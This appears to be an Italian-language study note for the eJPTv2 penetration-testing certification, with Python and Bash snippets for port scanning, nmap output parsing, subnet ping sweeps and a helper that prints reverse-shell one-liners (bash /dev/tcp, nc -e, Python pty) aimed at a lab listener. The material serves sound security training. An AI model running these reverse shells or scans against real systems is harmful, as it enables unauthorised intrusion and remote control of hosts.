# Scripting Snippets

**Difficolta:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [00-Fundamentals/03-Linux-Fundamentals.md](../00-Fundamentals/03-Linux-Fundamentals.md)
**Lab:** riferimento trasversale

---

## Obiettivo

Snippet Bash/Python riutilizzabili per automatizzare compiti ripetitivi durante un lab/engagement eJPTv2: scanning rapido, parsing output, enumeration su range IP, generazione one-liner di reverse shell.

---

## Python — scanner porte rapido con socket

```python
import socket
from concurrent.futures import ThreadPoolExecutor

target = "10.10.10.5"
ports = range(1, 1025)

def scan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] {target}:{port} aperta")
    s.close()

with ThreadPoolExecutor(max_workers=200) as pool:
    pool.map(scan, ports)
```

Utile quando nmap non e disponibile o va evitato un fingerprint troppo rumoroso — connect scan puro via socket TCP.

## Python — parser output nmap (grepable -oG)

```python
import re

with open("scan-allports.txt") as f:
    for line in f:
        if "Ports:" not in line:
            continue
        ip = line.split()[1]
        open_ports = re.findall(r"(\d+)/open", line)
        if open_ports:
            print(f"{ip}: {', '.join(open_ports)}")
```

Legge un file generato con `nmap -oG scan-allports.txt` ed estrae rapidamente IP + porte aperte per una tabella riassuntiva multi-host.

## Bash — loop enumeration su range IP

```bash
for ip in $(seq 1 254); do
  target="10.10.10.$ip"
  if ping -c1 -W1 "$target" &>/dev/null; then
    echo "[+] $target live"
    nmap -sV -T4 --top-ports 20 -oN "scan-$target.txt" "$target" &
  fi
done
wait
```

Ping sweep + scan rapido delle porte piu comuni in parallelo su un'intera subnet, ottimo primo passo su una rete lab con molti host.

## Bash — generatore reverse shell one-liner al volo

```bash
lhost="10.10.14.5"
lport="4444"
echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
echo "nc -e /bin/sh $lhost $lport"
echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$lhost\",$lport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawne(\"/bin/sh\")'"
```

Piccolo helper per non ridigitare a mano IP/porta ogni volta: stampa le varianti piu comuni gia compilate con i tuoi valori LHOST/LPORT correnti.

---

## Connessioni

- **Prerequisito:** [00-Fundamentals/03-Linux-Fundamentals.md](../00-Fundamentals/03-Linux-Fundamentals.md)
- **Combinazione con:** [02-Footprinting-Scanning/01-Nmap-Fundamentals.md](../02-Footprinting-Scanning/01-Nmap-Fundamentals.md), [08-Exploitation-PostEx/02-Reverse-Bind-Shells.md](../08-Exploitation-PostEx/02-Reverse-Bind-Shells.md)

---

## Note personali

_(spazio libero)_
